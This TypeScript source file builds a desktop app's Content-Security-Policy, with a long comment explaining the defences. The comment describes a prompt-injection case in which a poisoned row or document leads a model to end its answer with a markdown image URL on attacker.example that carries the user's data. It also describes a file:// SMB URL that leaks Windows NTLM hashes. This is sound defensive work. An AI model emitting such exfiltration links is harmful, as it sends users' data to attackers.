/*---------------------------------------------------------------------------------------------
 *  Copyright (c) 2026 SNOUTDATA INC. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// The renderer's Content-Security-Policy, written into index.html as a <meta> by a plugin in
// electron.vite.config.ts (a file: page has no response headers to carry one).
//
// Why it exists: the chat and agent surfaces render text a model wrote, and a
// model can be told by a poisoned row or document to end its answer with
// `![](https://attacker.example/p?d=<rows>)`. Without a policy the page fetches that image as soon
// as it paints, and the rows leave the machine with no click. Markdown.tsx already drops remote
// images; this is the wall behind it, and behind every other way a URL could reach the DOM.
//
// What the app really loads, and so what is allowed:
// - scripts, styles, fonts, workers: the app's own files ('self'). Monaco's workers are separate
//   files beside the bundle, and its fallback builds one from a blob: URL. Styles need
//   'unsafe-inline' because React's style attributes and Monaco's injected <style> are inline.
// - images: data: and blob: (the app's own pictures, inlined at build; chart exports, the canvas),
//   plus the two hosts a signed-in person's avatar comes from (Google and GitHub sign-in). NOT
//   'self': the packaged page is a file: URL, and Chromium matches 'self' there against every
//   file: URL, a host included, so `file://attacker/share/x.png` passed it. On Windows that URL is
//   an SMB connection that hands the user's NTLM hash to the host, and a database comment rendered
//   as markdown in a Monaco hover was enough to make one. So every image the
//   renderer ships is inlined (electron.vite.config.ts, `assetsInlineLimit`) and file: images are
//   not allowed at all. A dev run, served over http, keeps 'self' for Vite's asset URLs.
// - media: the release notes' bundled videos.
// - connect: nothing remote. Every network call (the gateway, Cloud, Sentry) is made by main;
//   Sentry's renderer SDK hands events to main over the `sentry-ipc:` scheme.
// - no plugins, no <base>, no form posts, no frames other than inline ones (the local mail
//   preview is a sandboxed srcdoc frame, which inherits this policy).
//
// A dev run (`npm run dev`) also needs Vite's inline React-refresh preamble and its HMR socket.

/** Hosts a signed-in person's avatar is served from: Google's profile-photo hosts (the OIDC
 *  `picture` claim is on lh3 today; older accounts carry lh4 to lh6) and GitHub's. Named one by
 *  one, never `*.googleusercontent.com`: that wildcard also covers hosts that serve content any
 *  Google user publishes (Apps Script, Drive, Colab), which would make an image a way out. A
 *  picture from anywhere else falls back to the placeholder (AccountSection.tsx). */
export const AVATAR_IMAGE_HOSTS = [
	'https://lh3.googleusercontent.com',
	'https://lh4.googleusercontent.com',
	'https://lh5.googleusercontent.com',
	'https://lh6.googleusercontent.com',
	'https://avatars.githubusercontent.com',
];

/** The policy, as the value of a Content-Security-Policy meta tag. */
export function rendererCsp(dev: boolean): string {
	const directives: Array<[string, string[]]> = [
		['default-src', ["'self'"]],
		['script-src', dev ? ["'self'", "'unsafe-inline'"] : ["'self'"]],
		['style-src', ["'self'", "'unsafe-inline'"]],
		['img-src', dev ? ["'self'", 'data:', 'blob:', ...AVATAR_IMAGE_HOSTS] : ['data:', 'blob:', ...AVATAR_IMAGE_HOSTS]],
		['media-src', ["'self'", 'data:', 'blob:']],
		['font-src', ["'self'", 'data:']],
		['connect-src', dev ? ["'self'", 'sentry-ipc:', 'data:', 'blob:', 'ws://localhost:*', 'ws://127.0.0.1:*'] : ["'self'", 'sentry-ipc:', 'data:', 'blob:']],
		['worker-src', ["'self'", 'blob:']],
		['frame-src', ["'self'"]],
		['object-src', ["'none'"]],
		['base-uri', ["'none'"]],
		['form-action', ["'none'"]],
	];
	return directives.map(([name, sources]) => `${name} ${sources.join(' ')}`).join('; ');
}
